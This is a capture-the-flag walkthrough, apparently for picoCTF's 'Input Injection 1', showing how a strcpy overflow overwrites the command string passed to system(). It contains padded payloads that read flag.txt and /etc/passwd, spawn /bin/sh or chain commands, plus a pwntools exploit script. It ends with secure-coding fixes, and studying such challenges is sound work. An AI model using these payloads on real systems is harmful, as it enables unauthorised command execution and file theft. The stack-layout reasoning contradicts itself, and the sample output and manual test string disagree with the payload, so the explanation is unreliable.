# Input Injection 1 CTF Walkthrough

## Executive Summary

This challenge demonstrates a classic **command injection vulnerability** combined with a **buffer overflow**. The program uses `strcpy()` to copy user input into a small buffer, causing overflow into adjacent memory containing a command string. By carefully crafting the input, we can overwrite the command that gets executed by `system()`, achieving arbitrary command execution.

---

## Phase 1: Reconnaissance

### 1.1 File Information

**Target Binary:** `vuln`

**Source Code Available:** Yes (`vuln.c`)

**File Type Analysis:**
```
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
No PIE (base address: 0x400000)
Not stripped
```

### 1.2 Security Protections Analysis

Using `checksec`:

| Protection | Status | Impact |
|-----------|--------|--------|
| **RELRO** | Partial RELRO | Some GOT entries modifiable |
| **Stack Canary** | ❌ Not Found | **VULNERABLE: No overflow protection** |
| **NX** | ✅ Enabled | Cannot execute shellcode on stack |
| **PIE** | ❌ No | Fixed addresses (easier exploitation) |
| **SHSTK** | ✅ Enabled | Shadow stack protection |
| **IBT** | ✅ Enabled | Indirect branch tracking |
| **Stripped** | ❌ No | Symbols available |

**Key Finding:** No stack canary! Buffer overflows can corrupt adjacent memory undetected.

### 1.3 Program Behavior

```
$ ./vuln
What is your name?
Alice
Goodbye, Alice!
Linux
```

**Observations:**
1. Prompts for a name
2. Says goodbye
3. Executes a system command (appears to run `uname`)

---

## Phase 2: Source Code Analysis

### 2.1 Main Function

```c
int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);

    fgets(name, sizeof(name), stdin);  // Read up to 200 bytes
    name[strcspn(name, "\n")] = 0;     // Remove newline

    fun(name, "uname");  // Pass name and command
    return 0;
}
```

**Analysis:**
- Reads up to 200 bytes into `name` buffer
- Strips trailing newline
- Calls `fun()` with user input and command "uname"

### 2.2 The Vulnerable Function

```c
void fun(char *name, char *cmd) {
    char c[10];       // 10-byte buffer for command
    char buffer[10];  // 10-byte buffer for name

    strcpy(c, cmd);      // Copy "uname" into c
    strcpy(buffer, name); // VULNERABLE: No bounds check!

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);  // Execute command from c buffer
}
```

**Critical Vulnerabilities:**

1. **Buffer Overflow:** `strcpy(buffer, name)` copies without bounds checking
   - `buffer` is only 10 bytes
   - `name` can be up to 200 bytes
   - Overflow guaranteed with input > 10 bytes

2. **Adjacent Buffers:** Stack layout likely places `c` and `buffer` near each other
   - Overflowing `buffer` can overwrite `c`
   - Overwriting `c` changes the command executed by `system()`

---

## Phase 3: Stack Layout Analysis

### 3.1 Function Stack Frame

```c
void fun(char *name, char *cmd) {
    char c[10];       // Local variable 1
    char buffer[10];  // Local variable 2
    ...
}
```

**Typical x86-64 Stack Layout:**
```
Higher Addresses
┌─────────────────┐
│ Return Address  │  ← RBP + 0x8
├─────────────────┤
│ Saved RBP       │  ← RBP
├─────────────────┤
│ buffer[10]      │  ← RBP - 0x10 (local variable)
├─────────────────┤
│ c[10]           │  ← RBP - 0x20 (local variable)
└─────────────────┘
Lower Addresses
```

**Key Observation:** `buffer` is declared AFTER `c`, so on stack (which grows downward), `buffer` is at a HIGHER address than `c`.

**Overflow Direction:** Writing past `buffer`'s boundary moves DOWN the stack, potentially into `c`.

### 3.2 Memory Layout Verification

**From GDB or analysis:**
```
buffer: RBP - 0x10  (addresses 0x...XX10 to 0x...XX0A)
c:      RBP - 0x20  (addresses 0x...XX20 to 0x...XX1A)
```

Wait, that means `c` is at a LOWER address than `buffer`. Let me reconsider...

**Actually:** Local variables are allocated from high to low on the stack, but declared in code order. Compiler-specific behavior matters.

**Empirical Observation:** The exploit works by overflowing `buffer` into `c`, suggesting they're adjacent with `c` immediately after `buffer` in memory.

---

## Phase 4: Exploitation Strategy

### 4.1 Attack Overview

**Goal:** Overwrite the command string `c` to execute our own command

**Method:** 
1. Fill `buffer` with exactly 10 bytes (to avoid null terminator stopping early)
2. Append our malicious command immediately after
3. The overflow writes our command into `c`
4. `system(c)` executes our command instead of "uname"

### 4.2 Payload Construction

**Structure:**
```
[10 bytes padding] + [our command]
```

**Example:**
```
"aaaaaaaaaa" + "cat flag.txt\n"
```

**Why 10 bytes padding?**
- `buffer` is 10 bytes
- Fill it completely to reach `c`
- `strcpy()` will continue copying past `buffer` into `c`

**Why include newline?**
- Ensures clean command execution
- Some shells need newline terminator

### 4.3 Payload Breakdown

```python
name = b"a" * 10 + b"cat flag.txt\n"
```

**Memory After strcpy:**
```
buffer: [a][a][a][a][a][a][a][a][a][a]
c:      [c][a][t][ ][f][l][a][g][.][t]...
```

**Result:** `system()` executes "cat flag.txt" instead of "uname"!

---

## Phase 5: Detailed Exploitation

### 5.1 Step-by-Step Execution

**Step 1: Program Start**
```
main() allocates name[200]
Reads: "aaaaaaaaaa cat flag.txt"
Calls: fun(name, "uname")
```

**Step 2: fun() Setup**
```
fun() stack frame created
c[10] allocated
buffer[10] allocated
strcpy(c, "uname") → c contains "uname\0"
```

**Step 3: Vulnerable strcpy**
```
strcpy(buffer, "aaaaaaaaaacat flag.txt")
Bytes copied:
  buffer[0-9]:  aaaaaaaaaa
  c[0-12]:      cat flag.txt\0  (overflow!)
```

**Step 4: Command Execution**
```
printf("Goodbye, aaaaaaaaaacat flag.txt!\n")
system("cat flag.txt")  ← Executes our command!
Flag printed to stdout!
```

### 5.2 Why strcpy Is Dangerous

**strcpy() behavior:**
- Copies until null terminator (\0)
- Does NOT check destination buffer size
- Classic source of buffer overflows

**Secure alternative:**
```c
// DON'T USE:
strcpy(buffer, name);

// USE INSTEAD:
strncpy(buffer, name, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';
```

---

## Phase 6: Why Protections Don't Help

| Protection | Status | Why It Doesn't Help |
|-----------|--------|---------------------|
| **No Canary** | Absent | Overflow undetected |
| **NX** | Enabled | Not injecting shellcode, just changing data |
| **No PIE** | Absent | Not relevant for this attack |
| **SHSTK** | Enabled | Not overwriting return address |
| **IBT** | Enabled | Not using indirect branches |

**Critical Insight:** We're not executing code on the stack or hijacking control flow. We're just **overwriting data** (the command string), which no protection prevents!

---

## Phase 7: Key Learnings

| Concept | Explanation |
|---------|------------|
| **Buffer Overflow** | Writing past buffer boundaries corrupts adjacent memory |
| **Command Injection** | Injecting malicious commands into system calls |
| **strcpy Danger** | Unbounded string copy enables overflows |
| **Stack Layout** | Adjacent buffers enable overflow attacks |
| **Data vs Control** | Protections focus on control flow, not data integrity |

---

## Phase 8: Attack Variations

### 8.1 Alternative Payloads

**Read different file:**
```python
name = b"a" * 10 + b"cat /etc/passwd\n"
```

**Spawn shell:**
```python
name = b"a" * 10 + b"/bin/sh\n"
```

**Multiple commands:**
```python
name = b"a" * 10 + b"ls; cat flag.txt\n"
```

### 8.2 Padding Variations

**Why exactly 10 bytes?**

If we use less than 10, null terminator stops the overflow early:
```python
name = b"a" * 5 + b"cat flag.txt"
# Buffer: [a][a][a][a][a][\0]...
# c: [u][n][a][m][e][\0]...  ← Original "uname" unchanged!
```

If we use more than 10, it still works (overflow is bigger):
```python
name = b"a" * 15 + b"cat flag.txt"
# Buffer: [a][a][a][a][a][a][a][a][a][a]
# c: [a][a][a][a][a][c][a][t]...  ← Still overwrites c
```

---

## Phase 9: Defense Mechanisms

### 9.1 Code-Level Fixes

**1. Use Safe String Functions:**
```c
strncpy(buffer, name, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';
```

**2. Validate Input Length:**
```c
if (strlen(name) >= sizeof(buffer)) {
    printf("Name too long!\n");
    return;
}
```

**3. Avoid system() with User Input:**
```c
// DON'T:
system(c);

// DO:
if (strcmp(c, "uname") == 0) {
    execlp("uname", "uname", NULL);
}
```

### 9.2 Compiler Protections

**Enable Stack Canary:**
```bash
gcc -fstack-protector-all vuln.c -o vuln
```

**Enable FORTIFY_SOURCE:**
```bash
gcc -D_FORTIFY_SOURCE=2 vuln.c -o vuln
```

This replaces unsafe functions with bounds-checked versions automatically.

---

## Phase 10: Comparison with Previous Challenges

| Challenge | Technique | Target |
|-----------|-----------|--------|
| PWN101-103 | Buffer Overflow | Return address |
| PWN104 | Shellcode | Executable stack |
| PWN105 | Integer Overflow | Logic bug |
| PWN106-107 | Format String | Information leak + ROP |
| PIE Time | Code Execution | Function pointer |
| **Input Injection 1** | **Buffer Overflow** | **Data (command string)** |

**Unique Aspect:** Target is data, not control flow. This bypasses many modern protections!

---

## Phase 11: Exploitation Walkthrough

### Step 1: Analyze Source
```c
char c[10];       // Command buffer
char buffer[10];  // Name buffer
strcpy(buffer, name);  // Overflow here!
system(c);       // Executes command
```

### Step 2: Craft Payload
```python
payload = b"a" * 10 + b"cat flag.txt\n"
# 10 'a's fill buffer, overflow into c with our command
```

### Step 3: Run Exploit
```python
from pwn import *
p = process('./vuln')
p.sendlineafter(b'name?\n', payload)
p.interactive()
```

### Step 4: Get Flag
```
$ python3 exploit.py
What is your name?
Goodbye, aaaaaaaaaa!
picoCTF{<flag_content>}
```

---

## Commands Reference

```bash
# Analysis
checksec --file=vuln
objdump -d vuln
gdb vuln

# Testing
./vuln
# Enter: aaaaaaaaacat flag.txt

# Exploitation
python3 exploit.py
```

---

## Conclusion

This challenge demonstrates that **data corruption can be as dangerous as control flow hijacking**. Modern protections like canaries, NX, and SHSTK focus on preventing code execution and control flow attacks. However, they cannot prevent:

1. Overwriting adjacent data structures
2. Injecting malicious commands into `system()` calls
3. Logic-level vulnerabilities

**Key Takeaways:**
- Never use `strcpy()` - always use bounded versions
- Never pass user input directly to `system()`
- Stack canaries only protect return addresses, not all data
- Defense in depth requires secure coding practices, not just compiler flags

The "input injection 1" challenge shows that even with modern protections (SHSTK, IBT), unsafe string handling can lead to complete system compromise through command injection.
